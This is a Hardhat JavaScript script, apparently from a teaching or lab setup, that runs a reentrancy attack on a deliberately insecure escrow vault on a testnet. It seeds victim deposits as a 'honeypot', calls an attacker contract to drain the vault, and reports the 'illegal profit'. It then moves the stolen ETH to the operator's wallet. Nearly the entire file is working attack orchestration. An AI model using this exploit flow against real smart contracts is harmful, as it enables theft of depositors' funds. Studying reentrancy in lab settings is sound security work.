const { ethers } = require("hardhat");

const INsecure_Vault_ADDR = process.env.INsecure_Vault_ADDR || "";
const ATTACKER_ADDR = process.env.ATTACKER_ADDR || "";

const BUYER_A_DEPOSIT = ethers.parseEther("0.0001");
const BUYER_B_DEPOSIT = ethers.parseEther("0.00005");
const ATTACKER_DEPOSIT = ethers.parseEther("0.00001");
const TOTAL_HONEYPOT = BUYER_A_DEPOSIT + BUYER_B_DEPOSIT;

function log(msg) {
  console.log(`[${new Date().toISOString().slice(11, 19)}] ${msg}`);
}

async function main() {
  if (!INsecure_Vault_ADDR || !ATTACKER_ADDR) {
    console.error("ERROR: Set INsecure_Vault_ADDR and ATTACKER_ADDR in .env");
    console.error("Run deploy_testnet.js first to get the addresses.");
    process.exit(1);
  }

  const [wallet] = await ethers.getSigners();
  log(`Wallet: ${wallet.address}`);
  log(`Balance: ${ethers.formatEther(await ethers.provider.getBalance(wallet.address))} ETH`);

  const insecureVault = await ethers.getContractAt("InsecureVault", INsecure_Vault_ADDR);
  const attacker = await ethers.getContractAt("Attacker", ATTACKER_ADDR);

  log(`InsecureVault: ${INsecure_Vault_ADDR}`);
  log(`Attacker: ${ATTACKER_ADDR}`);

  log("\n=== PHASE 1: SETUP HONEYPOT ===");

  const seller = ethers.Wallet.createRandom().address;
  log(`Legitimate seller (random address): ${seller}`);

  log("Buyer A creates order + deposits + confirms...");
  let tx = await insecureVault.createOrder(seller);
  await tx.wait();
  tx = await insecureVault.depositFunds(0, { value: BUYER_A_DEPOSIT });
  await tx.wait();
  tx = await insecureVault.confirmDelivery(0);
  await tx.wait();
  log(`Buyer A deposited ${ethers.formatEther(BUYER_A_DEPOSIT)} ETH`);

  log("Buyer B creates order + deposits + confirms...");
  tx = await insecureVault.createOrder(seller);
  await tx.wait();
  tx = await insecureVault.depositFunds(1, { value: BUYER_B_DEPOSIT });
  await tx.wait();
  tx = await insecureVault.confirmDelivery(1);
  await tx.wait();
  log(`Buyer B deposited ${ethers.formatEther(BUYER_B_DEPOSIT)} ETH`);

  log("Attacker registers as seller, order 2...");
  tx = await insecureVault.createOrder(ATTACKER_ADDR);
  await tx.wait();
  tx = await insecureVault.depositFunds(2, { value: ATTACKER_DEPOSIT });
  await tx.wait();
  tx = await insecureVault.confirmDelivery(2);
  await tx.wait();
  log(`Attacker's legitimate balance: ${ethers.formatEther(ATTACKER_DEPOSIT)} ETH`);

  const vaultBalance = await insecureVault.getContractBalance();
  log(`\nVault balance (honeypot): ${ethers.formatEther(vaultBalance)} ETH`);
  log(`Victim funds at stake: ${ethers.formatEther(TOTAL_HONEYPOT)} ETH`);
  log(`Attacker vault balance: ${ethers.formatEther(await insecureVault.getBalance(ATTACKER_ADDR))} ETH`);

  log("\n=== PHASE 2: EXECUTE REENTRANCY ATTACK ===");
  const attackerBalBefore = await attacker.getAttackerBalance();
  log(`Attacker contract ETH before: ${ethers.formatEther(attackerBalBefore)} ETH`);

  tx = await attacker.attack();
  await tx.wait();
  log("Attack transaction successful!");

  const reentryCount = await attacker.getReentrancyCount();
  log(`Reentrancy loops triggered: ${reentryCount}`);

  log("\n=== PHASE 3: RESULTS ===");
  const vaultBalanceAfter = await insecureVault.getContractBalance();
  const attackerBalAfter = await attacker.getAttackerBalance();
  const illegalProfit = attackerBalAfter - ATTACKER_DEPOSIT;

  log(`Vault balance after attack: ${ethers.formatEther(vaultBalanceAfter)} ETH`);
  log(`Attacker contract ETH after: ${ethers.formatEther(attackerBalAfter)} ETH`);
  log(`Illegal profit: ${ethers.formatEther(illegalProfit)} ETH`);

  if (illegalProfit > 0n) {
    log("\n*** ATTACK SUCCESSFUL - FUNDS STOLEN ***");

    log("\n=== PHASE 4: EXFILTRATE TO WALLET ===");
    const eoaBefore = await ethers.provider.getBalance(wallet.address);
    tx = await attacker.collectFunds();
    await tx.wait();
    const eoaAfter = await ethers.provider.getBalance(wallet.address);
    log(`Wallet ETH before: ${ethers.formatEther(eoaBefore)} ETH`);
    log(`Wallet ETH after:  ${ethers.formatEther(eoaAfter)} ETH`);
    log(`Profit exfiltrated to wallet: ${ethers.formatEther(attackerBalAfter)} ETH`);
  } else {
    log("\n*** ATTACK FAILED - Vault protected ***");
  }

  log("\n=== DONE ===");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
